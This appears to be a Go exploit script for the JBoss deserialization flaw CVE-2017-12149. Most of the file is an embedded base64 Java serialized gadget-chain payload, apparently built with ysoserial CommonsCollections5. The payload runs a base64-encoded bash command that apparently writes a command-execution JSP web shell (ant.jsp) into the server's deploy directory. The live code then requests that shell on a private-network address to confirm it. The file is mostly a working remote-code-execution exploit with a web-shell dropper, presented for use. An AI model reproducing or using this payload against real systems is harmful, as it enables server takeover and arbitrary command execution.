package main

import (
	"fmt"
	"log"
	"net/http"
	"time"
)

var payload = `"rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW` +
	`5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZ` +
	`hL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVy` +
	`AB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAA3NyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsY` +
	`XJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAUXQAJnlzb3NlcmlhbC5wYXlsb2Fkcy5Db21tb25zQ29sbGVjdGlvbnM1dAAYQ29tbW9uc0NvbGxlY3` +
	`Rpb25zNS5qYXZhdAAJZ2V0T2JqZWN0c3EAfgALAAAAM3EAfgANcQB+AA5xAH4AD3NxAH4ACwAAACJ0ABl5c29zZXJpYWwuR2VuZXJhdGVQYXlsb2FkdAAUR2VuZXJhdGVQYXlsb2FkLmphdmF0AAR` +
	`tYWluc3IAJmphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVMaXN0/A8lMbXsjhACAAFMAARsaXN0cQB+AAd4cgAsamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUNvbGxl` +
	`Y3Rpb24ZQgCAy173HgIAAUwAAWN0ABZMamF2YS91dGlsL0NvbGxlY3Rpb247eHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhxAH4AGnhzcgA0b` +
	`3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmtleXZhbHVlLlRpZWRNYXBFbnRyeYqt0ps5wR/bAgACTAADa2V5cQB+AAFMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcm` +
	`cuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3I` +
	`AOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9j` +
	`b2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vb` +
	`nMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAF4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3` +
	`JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV` +
	`xAH4ABVsAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5D` +
	`bGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AMgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ADJzcQB+ACt1cQB+AC8AAAACcHVxAH4ALwAAAAB0A` +
	`AZpbnZva2V1cQB+ADIAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAvc3EAfgArdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQB2WJhc2ggLW` +
	`Mge2VjaG8sWldOb2J5QW5QQ1VLQ1dwaGRtRXVhVzh1U1c1d2RYUlRkSEpsWVcwZ2FXNGdQU0JTZFc1MGFXMWxMbWRsZEZKMWJuUnBiV1VvS1M1bGVHVmpLSEpsY1hWbGMzUXVaMlYwVUdGeVlXMWx` +
	`kR1Z5S0NKamJXUWlLU2t1WjJWMFNXNXdkWFJUZEhKbFlXMG9LVHNLQ1dsdWRDQmhJRDBnTFRFN0NnbGllWFJsVzEwZ1lpQTlJRzVsZHlCaWVYUmxXekl3TkRoZE93b0pkMmhwYkdVb0tHRTlhVzR1` +
	`Y21WaFpDaGlLU2toUFMweEtYc0tDUWxUZEhKcGJtY2djeUE5SUc1bGR5QlRkSEpwYm1jb1lpazdDZ2tKY3lBOUlITXVjbVZ3YkdGalpVRnNiQ2dpVzF4MU1EQXdNRjBpTENBaUlpazdDZ2tKYjNWM` +
	`ExuQnlhVzUwYkc0b2N5azdDZ2w5Q2drbFBpY2dQaUF2YW1KdmMzTXROaTR4TGpBdVJtbHVZV3d2YzJWeWRtVnlMMlJsWm1GMWJIUXZaR1Z3Ykc5NUwxSlBUMVF1ZDJGeUwyRnVkQzVxYzNBPX18e2` +
	`Jhc2U2NCwtZH18e2Jhc2gsLWl9dAAEZXhlY3VxAH4AMgAAAAFxAH4AN3NxAH4AJ3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0` +
	`LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eA=="`

// 网站目录/jboss-6.1.0.Final/server/default/deploy/ROOT.war/ant.jsp
// JBoss CVE-2017-12149
func main() {
	// 1.读取payload
	// data, err := ioutil.ReadFile("poc.ser")
	// if err != nil {
	// 	log.Fatal(err)
	// }
	// // 2.转换成base64
	// cc, err := json.Marshal(data)
	// if err != nil {
	// 	log.Fatal(err)
	// }
	// // fmt.Println(string(cc))
	// payload = string(cc)
	// fmt.Println("payload: ", payload)
	// var out []byte
	// if err := json.Unmarshal([]byte(payload), &out); err != nil {
	// 	log.Fatal(err)
	// }
	// // 2.发送payload请求
	cli := http.Client{Timeout: 30 * time.Second}
	req, _ := http.NewRequest("GET", "http://192.168.27.131:8080/ant.jsp", nil)
	resp, err := cli.Do(req)
	if err != nil {
		log.Fatal(2001, err)
	}
	fmt.Println(resp.StatusCode)
}
